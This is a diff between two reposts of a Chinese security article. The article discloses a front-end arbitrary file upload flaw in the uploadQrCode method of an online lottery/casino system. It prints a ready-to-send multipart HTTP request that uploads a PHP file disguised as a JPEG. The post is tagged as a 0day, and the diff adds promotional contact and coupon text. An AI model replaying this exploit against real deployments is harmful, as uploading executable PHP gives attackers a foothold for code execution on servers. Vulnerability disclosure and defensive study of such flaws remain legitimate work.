@@ -1,6 +1,5 @@
 #  某火cai票娱乐城系统存在前台任意文件上传漏洞  
-原创 XingYue404
-                    XingYue404  星悦安全   2026-03-16 06:39  
+ C4安全   2026-03-23 01:31  
   
 ![图片](https://mmbiz.qpic.cn/sz_mmbiz_jpg/lSQtsngIibibSOeF8DNKNAC3a6kgvhmWqvoQdibCCk028HCpd5q1pEeFjIhicyia0IcY7f2G9fpqaUm6ATDQuZZ05yw/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&randomid=1jvfty28&tp=webp#imgIndex=0 "")  
   
@@ -23,7 +22,7 @@
   
 **位于 /api/app/controller/api/WithdrawController.php 控制器的uploadQrCode 方法通过 $file->move() 上传文件，且过滤不严格，导致任意文件上传漏洞产生.**  
 ```
-public function uploadQrCode(Request $request)
+public function uploadQrCode(Request $request)
   {
     $userId = $request->userId ?? 0;
 
@@ -103,37 +102,58 @@ Route::group('/api/v1', function () {
   
 **Payload:**  
 ```
-POST /api/v1/withdraw/upload-qrcode HTTP/2
-Host: 127.0.0.1
-Cookie: server_name_session=66d9ce13c9eaad4828c06dfa366aaa2f
-Content-Length: 197
-Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryT2GEWpMD4SoAY0IG
-Upgrade-Insecure-Requests: 1
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
-Accept-Encoding: gzip, deflate
-Accept-Language: zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7
-Authorization: 你的token
+POST /api/v1/withdraw/upload-qrcode HTTP/2
+Host: 127.0.0.1
+Cookie: server_name_session=66d9ce13c9eaad4828c06dfa366aaa2f
+Content-Length: 197
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryT2GEWpMD4SoAY0IG
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7
+Authorization: 你的token
 
 ------WebKitFormBoundaryT2GEWpMD4SoAY0IG
 Content-Disposition: form-data; name="file"; filename="1.php"
 Content-Type: image/jpeg
 
-<?php phpinfo();?>
+<?php phpinfo();?>
 ------WebKitFormBoundaryT2GEWpMD4SoAY0IG--
 ```  
   
 ![image.png](https://mmbiz.qpic.cn/mmbiz_png/De3yb4u5JSrto5MwibOb86MRZcjDgu5ISH0IwJvjqmSgjIPDUoZehnDzicMvicqH1PkUuyLhqn2KKibXGYM0gA2EiayKFmtnDNd8mibof225iabPYQ/640?wx_fmt=png&from=appmsg "")  
   
 ![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/De3yb4u5JSq1DPFSiaSibNtXpBLMfNqGnGw5vN2mzNNIclRN9zZV1J5dxrysPHdiaxmZ25EKQcCE2JuHoDYId2184MZibNGl8qwV90DM61ruYWc/640?wx_fmt=png&from=appmsg "")  
-## 0x02 源码下载  
-  
-**标签:代码审计，0day，渗透测试，系统，通用，0day，闲鱼，交易所**  
-  
-**由于该源码特殊性，知识星球内获取.**  
-  
-****  
   
 ****  
 **免责声明:文章中涉及的程序(方法)可能带有攻击性，仅供安全研究与教学之用，读者将其信息做其他用途，由读者承担全部法律及连带责任，文章作者和本公众号不承担任何法律及连带责任，望周知！！!**  
+  
+  
+感兴趣的师傅可以公众号私聊我  
+进团队交流群，  
+咨询问题，hvv简历投递，nisp和cisp考证都可以联系我  
+  
+**内部src培训视频，内部知识圈，可私聊领取优惠券，加入链接：https://wiki.freebuf.com/societyDetail?society_id=184**  
+  
+**安全渗透感知大家族**  
+  
+![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/niasx7fyic9COP0dhPpvfwgOcsxvlLjHJ2FX0P9eib559uqEBMoejSqLYg9HUflsBfXibwMCJU9wjhp9qqSIgsAXqWErLc2FtK6nPsO7rqb9yjk/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1#imgIndex=13 "")  
+  
+****  
+（新人优惠券折扣  
+20.0  
+￥，扫码即可领取更多优惠）  
+  
+![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/niasx7fyic9CM2vbibDnRe26wJCaYibFGWUYkXTbVCDmBqx2Jh0uZ4Fanwcbpib5OdMG8q7Ie0nD0XDibqDhBUyibdsLx4L1e4ObtRkSZqVPfk0Giag/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1#imgIndex=14 "")  
+  
+![图片](https://mmbiz.qpic.cn/mmbiz_jpg/niasx7fyic9COCkUfSeoNxUnEOKvzLL2yNgR3GuDASvdBuDuCBuHGibv8c6cmn5eBe4g5wCoK2I67arXsyPDMjluHp7y9SbAmhfvjoqqVoDTZY/640?wx_fmt=jpeg&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1#imgIndex=15 "")  
+  
+****  
+**加入团队、加入公开群等都可联系微信：yukikhq，搜索添加即可**  
+  
+****  
+END  
+  
+  
   
